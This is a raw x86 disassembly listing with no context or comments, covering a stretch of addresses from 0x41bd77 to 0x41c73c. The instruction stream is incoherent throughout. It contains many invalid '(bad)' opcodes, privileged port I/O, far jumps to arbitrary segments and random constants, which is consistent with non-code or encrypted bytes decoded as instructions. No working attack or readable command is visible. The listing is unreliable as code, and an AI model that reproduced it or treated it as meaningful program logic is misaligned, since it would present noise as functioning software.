  41bd77:	test   al,0xe3
  41bd79:	(bad)  
  41bd7a:	bndldx (bad),[edx+edx*1-0x4a5a8409]
  41bd82:	xchg   BYTE PTR [eax],bl
  41bd84:	or     eax,edx
  41bd86:	in     al,dx
  41bd87:	xor    eax,0x4303e5a
  41bd8c:	and    esi,0xffffffca
  41bd8f:	das    
  41bd90:	cmp    BYTE PTR [ecx+0x7],bl
  41bd93:	stos   DWORD PTR es:[edi],eax
  41bd94:	adc    eax,0x7382e325
  41bd99:	jg     0x41bd62
  41bd9b:	add    eax,0xde6f7024
  41bda0:	stos   BYTE PTR es:[edi],al
  41bda1:	fstp   st(3)
  41bda3:	ror    BYTE PTR cs:[ebp+0x1e5d06d2],cl
  41bdaa:	pop    ecx
  41bdab:	daa    
  41bdac:	ds addr16 loope 0x41bde2
  41bdb0:	leave  
  41bdb1:	fdivr  QWORD PTR [ebp-0x45]
  41bdb4:	retf   
  41bdb5:	pushf  
  41bdb6:	xchg   ecx,eax
  41bdb7:	nop
  41bdb8:	and    eax,0x4fbb6276
  41bdbd:	sub    DWORD PTR [eax+eiz*8+0x2c821021],esp
  41bdc4:	dec    ecx
  41bdc5:	push   ebx
  41bdc6:	add    BYTE PTR [esi+0x4b],0x49
  41bdca:	cli    
  41bdcb:	xor    BYTE PTR [ebx-0x801d0f6],dl
  41bdd1:	jno    0x41bdfd
  41bdd3:	add    bl,BYTE PTR [esi]
  41bdd5:	dec    edi
  41bdd6:	outs   dx,DWORD PTR ds:[esi]
  41bdd7:	fwait
  41bdd8:	dec    edi
  41bdd9:	lods   al,BYTE PTR ds:[esi]
  41bdda:	mov    al,0xed
  41bddc:	jne    0x41be00
  41bdde:	mov    esi,0xe4ba4b8
  41bde3:	xor    dl,0x36
  41bde6:	mov    ah,0xeb
  41bde8:	scas   al,BYTE PTR es:[edi]
  41bde9:	popa   
  41bdea:	sbb    BYTE PTR [edi+eiz*8],bh
  41bded:	xor    BYTE PTR [eax+esi*8],dl
  41bdf0:	and    BYTE PTR [edx],dl
  41bdf2:	icebp  
  41bdf3:	jnp    0x41be15
  41bdf5:	mov    cl,0x8f
  41bdf7:	mov    ebx,0xb4bda3d8
  41bdfc:	js     0x41bdbf
  41bdfe:	cmp    dl,BYTE PTR [edi-0x44]
  41be01:	add    ecx,DWORD PTR [ebx]
  41be03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be04:	pusha  
  41be05:	hlt    
  41be06:	and    ecx,edx
  41be08:	dec    ecx
  41be09:	jo     0x41be7f
  41be0b:	mov    dl,0xc5
  41be0d:	dec    ebx
  41be0e:	ins    DWORD PTR es:[edi],dx
  41be0f:	(bad)  
  41be10:	cli    
  41be11:	mov    dh,0x84
  41be13:	and    dh,cl
  41be15:	xor    DWORD PTR [ecx],0x5ed21570
  41be1b:	mov    ecx,0xed6144de
  41be20:	aas    
  41be21:	test   al,0x9c
  41be23:	xchg   esi,edx
  41be25:	test   eax,0xa9bc5761
  41be2a:	aaa    
  41be2b:	je     0x41be4a
  41be2d:	add    al,0x38
  41be2f:	sub    esp,DWORD PTR [edx+0x72c2f127]
  41be35:	fs ror ah,1
  41be38:	imul   edi,DWORD PTR [eax-0x1f3bd2b7],0xffffffe3
  41be3f:	loopne 0x41bdff
	...
  41beb1:	add    BYTE PTR [eax],al
  41beb3:	add    ch,al
  41beb5:	stc    
  41beb6:	lods   eax,DWORD PTR ds:[esi]
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	cmovg  ebx,DWORD PTR [eax+edx*4+0x3f]
  41bec4:	push   ebx
  41bec5:	sub    eax,0xf50001
  41beca:	add    BYTE PTR [eax],al
  41becc:	out    dx,eax
  41becd:	jp     0x41bf36
  41becf:	mov    bh,0xb7
  41bed1:	push   0x31
  41bed3:	push   0x62
  41bed5:	xchg   ecx,eax
  41bed6:	pop    ds
  41bed7:	inc    esp
  41bed8:	sti    
  41bed9:	lods   eax,DWORD PTR ds:[esi]
  41beda:	stos   DWORD PTR es:[edi],eax
  41bedb:	fs aas 
  41bedd:	pop    esi
  41bede:	enter  0xd6d5,0xd5
  41bee2:	and    BYTE PTR [ebx+0x6d],0x98
  41bee6:	mov    edx,0xc96b6981
  41beeb:	sub    esi,esp
  41beed:	xor    ch,cl
  41beef:	dec    edi
  41bef0:	stos   DWORD PTR es:[edi],eax
  41bef1:	add    DWORD PTR [ecx-0x2d],edi
  41bef4:	adc    esi,esi
  41bef6:	arpl   WORD PTR ds:0x3b9ab751,bx
  41befc:	cmc    
  41befd:	add    BYTE PTR [esp+edi*1],bl
  41bf00:	test   DWORD PTR [ebx],0x1a50f103
  41bf06:	sub    DWORD PTR ss:[esi-0xbb45a0f],edi
  41bf0d:	rcr    BYTE PTR [ebx+ebp*1-0xd5bf8e0],cl
  41bf14:	pop    ss
  41bf15:	retf   
  41bf16:	pop    edx
  41bf17:	jns    0x41bea9
  41bf19:	fdiv   DWORD PTR [ebx+0x6a]
  41bf1c:	pop    es
  41bf1d:	pop    eax
  41bf1e:	mov    dh,0x51
  41bf20:	mov    ds:0xfcb71f33,eax
  41bf25:	sub    BYTE PTR [ebp+ecx*8-0x5e66d607],ah
  41bf2c:	adc    edx,DWORD PTR [eax+0x31]
  41bf2f:	in     eax,dx
  41bf30:	add    bl,BYTE PTR [ebx-0x1e4dbfa]
  41bf36:	pop    ebp
  41bf37:	xchg   esi,eax
  41bf38:	xchg   ecx,eax
  41bf39:	rcl    DWORD PTR [edi-0x41],cl
  41bf3c:	or     dh,BYTE PTR [ebx+0x76480871]
  41bf42:	pop    edi
  41bf43:	mov    DWORD PTR [edi-0x31],ebp
  41bf46:	or     DWORD PTR [ecx],esi
  41bf48:	mov    edi,0x738908c7
  41bf4d:	stos   BYTE PTR es:[edi],al
  41bf4e:	mov    BYTE PTR [edx+eax*1],ch
  41bf51:	dec    esi
  41bf52:	iret   
  41bf53:	shr    edi,0x71
  41bf56:	jmp    0x41bf2a
  41bf58:	outs   dx,BYTE PTR ds:[esi]
  41bf59:	scas   al,BYTE PTR es:[edi]
  41bf5a:	call   0x6e41:0x5a6ec704
  41bf61:	ss stc 
  41bf63:	lods   eax,DWORD PTR ds:[esi]
  41bf64:	iret   
  41bf65:	int    0xe1
  41bf67:	adc    edi,DWORD PTR [ebp-0x78477725]
  41bf6d:	push   ebp
  41bf6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf6f:	and    DWORD PTR [edx+0x61],ebx
  41bf72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf73:	pop    edi
  41bf74:	xor    cl,BYTE PTR [eax]
  41bf76:	clc    
  41bf77:	test   al,0x6a
  41bf79:	imul   esp,DWORD PTR [edx],0xb62f9604
  41bf7f:	xor    BYTE PTR [edi-0x1b],0x4f
  41bf83:	lods   al,BYTE PTR ds:[esi]
  41bf84:	cmp    al,0x16
  41bf86:	jns    0x41bf13
  41bf88:	adc    al,0x80
  41bf8a:	retf   
  41bf8b:	and    DWORD PTR [edi],ebx
  41bf8d:	push   esi
  41bf8e:	mov    ebp,DWORD PTR [ebp-0x53]
  41bf91:	mov    al,0xb2
  41bf93:	push   eax
  41bf94:	xor    BYTE PTR [eax],bl
  41bf96:	xor    BYTE PTR [ebx+0x289dc136],bh
  41bf9c:	pop    es
  41bf9d:	(bad)  
  41bf9e:	repnz adc BYTE PTR [esi+0x1a67bcbb],bh
  41bfa5:	or     esp,DWORD PTR [edx]
  41bfa7:	and    DWORD PTR [ebx+0x71],0x33
  41bfab:	xor    dh,BYTE PTR [edx]
  41bfad:	ud2    
  41bfaf:	and    BYTE PTR [ebx],dl
  41bfb1:	into   
  41bfb2:	lods   al,BYTE PTR ds:[esi]
  41bfb3:	scas   al,BYTE PTR es:[edi]
  41bfb4:	pop    esp
  41bfb5:	mov    ds:0x2a63bd73,al
  41bfba:	loope  0x41bfa2
  41bfbc:	fmul   DWORD PTR ds:0xdd55f3
	...
  41c032:	add    BYTE PTR [eax],al
  41c034:	(bad)  
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi-0x2744657f]
  41c041:	sub    al,0xe7
  41c043:	sub    ecx,DWORD PTR [eax+0x2e]
  41c046:	add    DWORD PTR [eax],eax
  41c048:	cmc    
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    BYTE PTR [ebx+0x414f7d25],bh
  41c051:	lock jb 0x41bffb
  41c054:	and    ah,dh
  41c056:	xchg   esi,eax
  41c057:	jbe    0x41c023
  41c059:	sub    DWORD PTR [ebx+0x1b],ecx
  41c05c:	jo     0x41c00b
  41c05e:	je     0x41bfff
  41c060:	push   edi
  41c061:	cmp    ch,BYTE PTR [eax]
  41c063:	or     al,0x6b
  41c065:	(bad)  [ebp+edi*4+0x372d397]
  41c06c:	cmp    BYTE PTR [eax-0x7d],al
  41c06f:	mov    bh,0x71
  41c071:	xchg   DWORD PTR [edx],eax
  41c073:	cs scas eax,DWORD PTR es:[edi]
  41c075:	and    al,0x4b
  41c077:	dec    edx
  41c078:	add    al,BYTE PTR [esi+0x366663be]
  41c07e:	repz jae 0x41c001
  41c081:	mov    al,0xf6
  41c083:	xchg   esp,eax
  41c084:	or     dl,BYTE PTR [edi+0x5b]
  41c087:	add    ch,BYTE PTR [edx]
  41c089:	pushf  
  41c08a:	adc    BYTE PTR ds:0xc8078efa,dl
  41c090:	ror    BYTE PTR [edi],0x10
  41c093:	rol    BYTE PTR [ebx+0x2c06196c],cl
  41c099:	retf   0x2245
  41c09c:	xor    dh,cl
  41c09e:	pop    es
  41c09f:	jmp    0x41c0de
  41c0a1:	inc    ebp
  41c0a2:	xor    DWORD PTR [ebx+ebx*8-0xb],esi
  41c0a6:	popf   
  41c0a7:	adc    al,0x2b
  41c0a9:	fld    st(5)
  41c0ab:	adc    DWORD PTR [ebx+0xc],ebp
  41c0ae:	adc    al,ah
  41c0b0:	fwait
  41c0b1:	sbb    al,ch
  41c0b3:	cwde   
  41c0b4:	repnz enter 0x1db2,0xa5
  41c0b9:	xor    eax,0xf293f081
  41c0be:	dec    ebp
  41c0bf:	jge    0x41c080
  41c0c1:	push   ebx
  41c0c2:	in     eax,0xdb
  41c0c4:	inc    ebp
  41c0c5:	push   ds
  41c0c6:	sub    eax,0x49ae5dbd
  41c0cb:	push   esi
  41c0cc:	jg     0x41c056
  41c0ce:	jle    0x41c078
  41c0d0:	adc    edi,DWORD PTR [edx+0x13]
  41c0d3:	sbb    ch,al
  41c0d5:	int    0x38
  41c0d7:	and    esp,esi
  41c0d9:	xor    BYTE PTR [edi-0x53],bh
  41c0dc:	adc    eax,0xdf22422c
  41c0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0e2:	pop    ds
  41c0e3:	pop    es
  41c0e4:	int3   
  41c0e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0e6:	cs aaa 
  41c0e8:	and    al,0x61
  41c0ea:	push   edi
  41c0eb:	test   DWORD PTR [ecx],esi
  41c0ed:	stos   BYTE PTR es:[edi],al
  41c0ee:	shr    BYTE PTR [eax+0x57],1
  41c0f1:	jo     0x41c11f
  41c0f3:	pusha  
  41c0f4:	pusha  
  41c0f5:	add    ebx,DWORD PTR [ebp+0x2f]
  41c0f8:	sub    al,0xd2
  41c0fa:	vpaddsb ymm3,ymm0,ymm0
  41c0fe:	hlt    
  41c0ff:	lods   al,BYTE PTR ds:[esi]
  41c100:	ins    DWORD PTR es:[edi],dx
  41c101:	stos   BYTE PTR es:[edi],al
  41c102:	mov    eax,ds:0xc70a7e43
  41c107:	jbe    0x41c14a
  41c109:	fist   WORD PTR [eax+eiz*8-0x45]
  41c10d:	sar    DWORD PTR [esi],cl
  41c10f:	das    
  41c110:	adc    BYTE PTR [esi],0x95
  41c113:	psrld  mm7,QWORD PTR [edx+esi*4]
  41c117:	lds    edx,FWORD PTR [ebp-0x62]
  41c11a:	pusha  
  41c11b:	retf   
  41c11c:	or     al,0x77
  41c11e:	push   ss
  41c11f:	fbstp  TBYTE PTR cs:[ebx]
  41c122:	and    eax,0xb84983eb
  41c127:	xchg   ebp,eax
  41c128:	push   ecx
  41c129:	aas    
  41c12a:	je     0x41c16b
  41c12c:	jle    0x41c18b
  41c12e:	push   esi
  41c12f:	dec    ecx
  41c130:	mov    eax,ds:0xd6af66ab
  41c135:	lods   eax,DWORD PTR ds:[esi]
  41c136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c137:	jmp    0x41c0fc
  41c139:	and    esi,esi
  41c13b:	adc    eax,0xfb3fc73a
  41c140:	test   DWORD PTR [eax],eax
	...
  41c1b2:	add    BYTE PTR [eax],al
  41c1b4:	mov    fs,WORD PTR [ebp-0x13941f97]
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0xd3832ee6
  41c1c4:	cmp    eax,0xf500012f
  41c1c9:	add    BYTE PTR [eax],al
  41c1cb:	add    BYTE PTR [esp+edi*8-0x9],ah
  41c1cf:	aad    0xd8
  41c1d1:	and    dl,cl
  41c1d3:	dec    eax
  41c1d4:	cwde   
  41c1d5:	sbb    DWORD PTR [edx],edx
  41c1d7:	sar    BYTE PTR [eax],0x83
  41c1da:	dec    eax
  41c1db:	jl     0x41c1d4
  41c1dd:	sub    esi,DWORD PTR [esi+0x2235e954]
  41c1e3:	mov    ds:0x15901503,eax
  41c1e8:	xor    al,BYTE PTR [edx+0x61]
  41c1eb:	ja     0x41c1b7
  41c1ed:	xchg   edi,eax
  41c1ee:	mov    eax,ds:0xb6ad1e8f
  41c1f3:	lods   al,BYTE PTR ds:[esi]
  41c1f4:	mov    esi,0x2e381471
  41c1f9:	xor    BYTE PTR [edx+0x3b],ch
  41c1fc:	sub    eax,0xfe5863f6
  41c201:	and    eax,0x551c4253
  41c206:	je     0x41c1ba
  41c208:	xchg   edx,eax
  41c209:	outs   dx,DWORD PTR ds:[esi]
  41c20a:	sbb    BYTE PTR fs:[edi-0x6],0x55
  41c20f:	bound  edx,QWORD PTR [ebx+0x6b2ea29a]
  41c215:	aam    0xc3
  41c217:	sbb    ecx,esi
  41c219:	xchg   esi,eax
  41c21a:	loopne 0x41c235
  41c21c:	xor    ebp,DWORD PTR [ecx+0x3]
  41c21f:	stos   DWORD PTR es:[edi],eax
  41c220:	mov    bl,0x9d
  41c222:	das    
  41c223:	push   es
  41c224:	dec    ecx
  41c225:	add    eax,0xfa2f3a54
  41c22a:	test   BYTE PTR [esi+0x77d57c8a],bl
  41c230:	pop    ds
  41c231:	adc    cl,BYTE PTR [edi-0x40]
  41c234:	push   ecx
  41c235:	cdq    
  41c236:	enter  0x5651,0x1f
  41c23a:	arpl   WORD PTR [ecx],si
  41c23c:	ss or  al,0x2c
  41c23f:	(bad)  
  41c240:	jns    0x41c2b3
  41c242:	and    DWORD PTR [edi+0x0],edi
  41c245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c246:	jo     0x41c25e
  41c248:	adc    ebp,DWORD PTR [ebp-0x1609d1d2]
  41c24e:	pop    ecx
  41c24f:	push   edx
  41c250:	jge    0x41c275
  41c252:	(bad)  
  41c253:	sti    
  41c254:	cmp    DWORD PTR [ebx],edi
  41c256:	pop    eax
  41c257:	xchg   DWORD PTR ds:0x1092ace2,ebx
  41c25d:	outs   dx,DWORD PTR ds:[esi]
  41c25e:	mov    bh,0xf1
  41c260:	push   edi
  41c261:	add    DWORD PTR [edi+0x2],ebp
  41c264:	cmp    al,0xec
  41c266:	push   0x8701c1b8
  41c26b:	xchg   DWORD PTR [eax],esi
  41c26d:	stc    
  41c26e:	cmp    eax,0xc4fc4091
  41c273:	dec    esi
  41c274:	dec    edi
  41c275:	cmp    DWORD PTR [edi+0x17317f45],edx
  41c27b:	sub    cl,al
  41c27d:	jp     0x41c2cf
  41c27f:	lock out 0xf0,al
  41c282:	jno    0x41c289
  41c284:	mov    edi,0xc87bcd3f
  41c289:	outs   dx,DWORD PTR ds:[esi]
  41c28a:	fwait
  41c28b:	in     al,dx
  41c28c:	jno    0x41c262
  41c28e:	jno    0x41c270
  41c290:	push   cs
  41c291:	enter  0xe53b,0x5
  41c295:	mov    ds:0xb85dddf0,eax
  41c29a:	not    DWORD PTR [ecx]
  41c29c:	add    DWORD PTR [edi+0x28],ecx
  41c29f:	push   ecx
  41c2a0:	cld    
  41c2a1:	xchg   DWORD PTR [edi-0x35],ebp
  41c2a4:	jnp    0x41c23a
  41c2a6:	les    esp,FWORD PTR [ebp+0x5592626f]
  41c2ac:	and    ebp,DWORD PTR [edx]
  41c2ae:	int    0xa3
  41c2b0:	pop    esi
  41c2b1:	(bad)  [ecx+0x3f66ff56]
  41c2b7:	imul   eax,DWORD PTR [ecx+0x39a0a276],0x4ced1699
	...
  41c331:	add    BYTE PTR [eax],al
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	or     bl,bh
  41c342:	out    dx,eax
  41c343:	xor    dh,BYTE PTR gs:[eax]
  41c346:	add    DWORD PTR [eax],eax
  41c348:	cmc    
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    cl,bl
  41c34d:	sub    edi,DWORD PTR [edx+ebp*4+0x48f079c0]
  41c354:	retf   
  41c355:	inc    esp
  41c356:	lahf   
  41c357:	(bad)  
  41c359:	mov    al,0xed
  41c35b:	push   ebp
  41c35c:	sub    bl,BYTE PTR [esi+0x73cc6301]
  41c362:	sbb    DWORD PTR ds:0x7780722a,eax
  41c368:	retf   
  41c369:	sahf   
  41c36a:	cli    
  41c36b:	ins    DWORD PTR es:[edi],dx
  41c36c:	jno    0x41c390
  41c36e:	out    dx,al
  41c36f:	push   eax
  41c370:	sti    
  41c371:	call   0xaec0:0x9fc3abae
  41c378:	jg     0x41c30f
  41c37a:	mov    ah,0xf2
  41c37c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c37d:	mov    eax,0x7ce424
  41c382:	ret    0xc752
  41c385:	jns    0x41c3df
  41c387:	inc    esi
  41c388:	loop   0x41c3d6
  41c38a:	fstp   QWORD PTR [esi+0x1d]
  41c38d:	jae    0x41c39b
  41c38f:	mov    ebx,0x729e5747
  41c394:	cmp    eax,0xf26a84b5
  41c399:	cmp    cl,BYTE PTR [eax+esi*4]
  41c39c:	sti    
  41c39d:	daa    
  41c39e:	push   es
  41c39f:	call   0xe4f2b692
  41c3a4:	sub    al,0xf2
  41c3a6:	pop    ss
  41c3a7:	xor    DWORD PTR [esi],edx
  41c3a9:	dec    esp
  41c3aa:	pop    es
  41c3ab:	sub    esp,DWORD PTR [ebx-0x73]
  41c3ae:	dec    ecx
  41c3af:	in     eax,dx
  41c3b0:	sar    bl,0xe6
  41c3b3:	loopne 0x41c412
  41c3b5:	aas    
  41c3b6:	out    dx,al
  41c3b7:	jg     0x41c34a
  41c3b9:	lock pusha 
  41c3bb:	stos   DWORD PTR es:[edi],eax
  41c3bc:	das    
  41c3bd:	test   DWORD PTR [esi+0x32],edi
  41c3c0:	sbb    DWORD PTR [ebp+0x3a],esp
  41c3c3:	out    0xd,eax
  41c3c5:	or     bl,BYTE PTR [esi]
  41c3c7:	inc    ebp
  41c3c8:	mov    edi,0xefbf6302
  41c3cd:	je     0x41c365
  41c3cf:	popa   
  41c3d0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41c3d2:	xchg   ecx,eax
  41c3d3:	inc    eax
  41c3d4:	vcvtps2pd ymm7,XMMWORD PTR [ebp-0x80]
  41c3d9:	cmp    BYTE PTR [ebx-0x3e],ah
  41c3dc:	cmp    esp,DWORD PTR [esi+0x6f]
  41c3df:	xlat   BYTE PTR ds:[ebx]
  41c3e0:	xchg   ebx,eax
  41c3e1:	adc    eax,0x77775d0d
  41c3e6:	jle    0x41c392
  41c3e8:	adc    al,0x2d
  41c3ea:	cmp    eax,0x71993f7a
  41c3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f0:	push   ecx
  41c3f1:	pop    esp
  41c3f2:	xchg   ebx,eax
  41c3f3:	mov    bh,0x60
  41c3f5:	and    ebp,DWORD PTR [ebx]
  41c3f7:	sub    bh,ah
  41c3f9:	repz jbe 0x41c391
  41c3fc:	outs   dx,DWORD PTR ds:[esi]
  41c3fd:	into   
  41c3fe:	dec    ebp
  41c3ff:	lahf   
  41c400:	call   0xb35f535c
  41c405:	(bad)  
  41c406:	mov    ds,WORD PTR [esi]
  41c408:	daa    
  41c409:	js     0x41c3df
  41c40b:	bound  edi,QWORD PTR [edx-0x3]
  41c40e:	adc    esp,DWORD PTR ds:0xb5fe97a8
  41c414:	pop    ebx
  41c415:	fist   WORD PTR [esi+0x40d6dfe2]
  41c41b:	xchg   ebp,eax
  41c41c:	out    dx,eax
  41c41d:	ret    0x1410
  41c420:	in     eax,0x54
  41c422:	mov    edx,0xb4717054
  41c427:	xchg   edx,eax
  41c428:	xor    ah,BYTE PTR [ebx+0x2]
  41c42b:	add    eax,0xbb8abc1b
  41c430:	jmp    0x24bc:0xdd5b6a4e
  41c437:	rcl    DWORD PTR [ebx+0x72],0xf1
  41c43b:	add    bl,BYTE PTR [ebx+0x7f]
  41c43e:	into   
  41c43f:	cmp    al,0xa3
	...
  41c4b1:	add    BYTE PTR [eax],al
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x698b37e7]
  41c4c4:	daa    
  41c4c5:	xor    DWORD PTR [ecx],eax
  41c4c7:	add    ch,dh
  41c4c9:	add    BYTE PTR [eax],al
  41c4cb:	add    BYTE PTR [ebp-0x37d4f032],bl
  41c4d1:	inc    ebp
  41c4d2:	pop    ss
  41c4d3:	in     al,dx
  41c4d4:	or     BYTE PTR [ecx+ecx*1],0x25
  41c4d8:	sbb    ebp,ebx
  41c4da:	iret   
  41c4db:	cmp    BYTE PTR [eax],0x45
  41c4de:	jns    0x41c506
  41c4e0:	xor    al,0xf3
  41c4e2:	or     al,0xa9
  41c4e4:	mov    al,ds:0xd215df36
  41c4e9:	xor    DWORD PTR [ecx+eax*2],0x7863be90
  41c4f0:	imul   ecx,DWORD PTR [ebx-0x222e7fe],0x2c
  41c4f7:	xor    bh,BYTE PTR [esp+ebx*2-0x3a633a35]
  41c4fe:	enter  0xda99,0xd7
  41c502:	gs push ds
  41c504:	(bad)  
  41c505:	in     al,dx
  41c506:	jno    0x41c4f5
  41c508:	in     al,dx
  41c509:	mov    ebx,0xc76b5f40
  41c50e:	adc    esi,ebp
  41c510:	push   0xffffffa9
  41c512:	hlt    
  41c513:	mov    edx,0x293523d3
  41c518:	inc    edi
  41c519:	pop    esp
  41c51a:	jbe    0x41c49f
  41c51c:	fdiv   QWORD PTR ds:0xe43ab0ef
  41c522:	sub    BYTE PTR [ecx+0x63],0x44
  41c526:	test   DWORD PTR [eax-0x3def597b],ebx
  41c52c:	sbb    BYTE PTR [eax+0x73],cl
  41c52f:	test   al,0x18
  41c531:	push   edi
  41c532:	inc    edx
  41c533:	jmp    0x7e9c:0x43698104
  41c53a:	jmp    0x41c58c
  41c53c:	les    eax,FWORD PTR [ecx-0x44]
  41c53f:	lods   al,BYTE PTR ds:[esi]
  41c540:	pop    ebx
  41c541:	mov    eax,0x9024448c
  41c546:	xchg   ecx,eax
  41c547:	mov    ch,ah
  41c549:	jle    0x41c4ea
  41c54b:	test   BYTE PTR [edi-0x33],bl
  41c54e:	mov    cl,0x61
  41c550:	cmp    al,0xef
  41c552:	pop    ss
  41c553:	fistp  QWORD PTR ds:0xc1e91de4
  41c559:	pusha  
  41c55a:	in     eax,0x2
  41c55c:	cmp    BYTE PTR [esi+0x3a443b5b],0x83
  41c563:	sbb    al,0xe7
  41c565:	(bad)  
  41c566:	rcl    DWORD PTR [esi-0x17d34d48],0xa5
  41c56d:	setg   BYTE PTR [ecx-0x7b]
  41c571:	stos   BYTE PTR es:[edi],al
  41c572:	or     edx,DWORD PTR [ebp-0xee713eb]
  41c578:	loop   0x41c5d5
  41c57a:	mov    ch,0xad
  41c57c:	mov    eax,ds:0xecbbba0b
  41c581:	inc    edx
  41c582:	dec    edi
  41c583:	ret    
  41c584:	mov    ds,WORD PTR [edi-0x41]
  41c587:	jg     0x41c600
  41c589:	inc    edi
  41c58a:	test   BYTE PTR [eax-0xf],0xc0
  41c58e:	pop    ebx
  41c58f:	popf   
  41c590:	dec    esp
  41c591:	xor    esp,edi
  41c593:	out    0x8a,eax
  41c595:	es sti 
  41c597:	stos   BYTE PTR es:[edi],al
  41c598:	in     al,0xd1
  41c59a:	test   al,0x94
  41c59c:	lea    ebp,[ecx+0x3a]
  41c59f:	push   esi
  41c5a0:	mov    edx,0xd8881e0c
  41c5a5:	jo     0x41c625
  41c5a7:	dec    ebp
  41c5a8:	hlt    
  41c5a9:	pop    eax
  41c5aa:	mov    eax,0xe58e4497
  41c5af:	fcomp  DWORD PTR [ebp+0x2b24a590]
  41c5b5:	or     BYTE PTR es:[esi-0x52],ah
  41c5b9:	xchg   BYTE PTR [ecx+0x7a],cl
  41c5bc:	mov    ecx,0x9425ff6
	...
  41c631:	add    BYTE PTR [eax],al
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	dec    eax
  41c641:	call   0x325dd032
  41c646:	add    DWORD PTR [eax],eax
  41c648:	cmc    
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    dl,bh
  41c64d:	push   edx
  41c64e:	adc    BYTE PTR [edi+esi*8-0x3a76a84a],0x18
  41c656:	cli    
  41c657:	xchg   esp,eax
  41c658:	jle    0x41c5fe
  41c65a:	cmp    ebp,DWORD PTR [eax-0x4c18d0a4]
  41c660:	and    al,0x38
  41c662:	stos   BYTE PTR es:[edi],al
  41c663:	xchg   edi,eax
  41c664:	and    eax,0x15660fe5
  41c669:	ss test edx,esp
  41c66c:	xchg   ecx,eax
  41c66d:	mov    BYTE PTR [edi+0x2035ae99],bh
  41c673:	inc    eax
  41c674:	jb     0x41c65e
  41c676:	sbb    DWORD PTR [ecx-0x76f53a7a],esp
  41c67c:	jo     0x41c6e2
  41c67e:	adc    dh,BYTE PTR [esi+ebp*4+0x3c278263]
  41c685:	mov    ch,0xe9
  41c687:	cmp    DWORD PTR [ebx+0x3e],0x433730a3
  41c68e:	cwde   
  41c68f:	xor    eax,0xd66ae3b4
  41c694:	and    BYTE PTR [edx-0x11008a19],cl
  41c69a:	or     DWORD PTR ds:0x8a0abeb6,esi
  41c6a0:	mov    ds:0xff7098c5,al
  41c6a5:	out    0x8b,eax
  41c6a7:	ror    DWORD PTR [eax],0x3c
  41c6aa:	outs   dx,DWORD PTR ds:[esi]
  41c6ab:	mov    al,ds:0x5915125f
  41c6b0:	(bad)  
  41c6b1:	or     DWORD PTR [esi],esp
  41c6b3:	loope  0x41c6b2
  41c6b5:	call   0xea61:0x41688429
  41c6bc:	mov    al,0x76
  41c6be:	xor    ah,BYTE PTR [edi+0x12dee23d]
  41c6c4:	push   es
  41c6c5:	sub    ecx,DWORD PTR [ebp+0x5f]
  41c6c8:	add    esi,DWORD PTR [esi]
  41c6ca:	(bad)  [eax]
  41c6cc:	lock daa 
  41c6ce:	js     0x41c677
  41c6d0:	mov    ecx,0xc09d3aec
  41c6d5:	loop   0x41c732
  41c6d7:	cs dec ecx
  41c6d9:	ss jmp 0xbad7:0x1688a3c4
  41c6e1:	(bad)  
  41c6e2:	mov    bl,0xf6
  41c6e4:	or     BYTE PTR [edi],0x6b
  41c6e7:	dec    esi
  41c6e8:	mov    ebx,0x88da5f03
  41c6ed:	lods   eax,DWORD PTR ds:[esi]
  41c6ee:	frstor [eax-0x5d]
  41c6f1:	fld    QWORD PTR [edx]
  41c6f3:	lods   al,BYTE PTR ds:[esi]
  41c6f4:	add    DWORD PTR [edi+ebx*2+0x2f],ebx
  41c6f8:	sbb    eax,0x3d299adc
  41c6fd:	in     al,0x2a
  41c6ff:	or     ch,ah
  41c701:	(bad)  
  41c702:	call   0xb382a149
  41c707:	mov    bh,cl
  41c709:	fs jmp 0x41c711
  41c70c:	div    al
  41c70e:	repz ret 
  41c710:	mov    dl,0x40
  41c712:	into   
  41c713:	jnp    0x41c6ce
  41c715:	popf   
  41c716:	jp     0x41c72e
  41c718:	imul   esp,ebx,0xffffffff
  41c71b:	les    ebp,FWORD PTR [edi+0x59]
  41c71e:	adc    ebp,DWORD PTR [esi]
  41c720:	add    esp,esi
  41c722:	leave  
  41c723:	jb     0x41c6ac
  41c725:	inc    ebp
  41c726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c727:	je     0x41c71f
  41c729:	inc    esp
  41c72a:	mov    dl,0x5a
  41c72c:	cmp    al,0xcb
  41c72e:	std    
  41c72f:	into   
  41c730:	ds or  eax,0x847cf06c
  41c736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c737:	mov    ch,0x7f
  41c739:	mov    ?,esp
  41c73b:	xchg   esi,eax
  41c73c:	rcl    DWORD PTR [esi+0x8c572e],1
	...
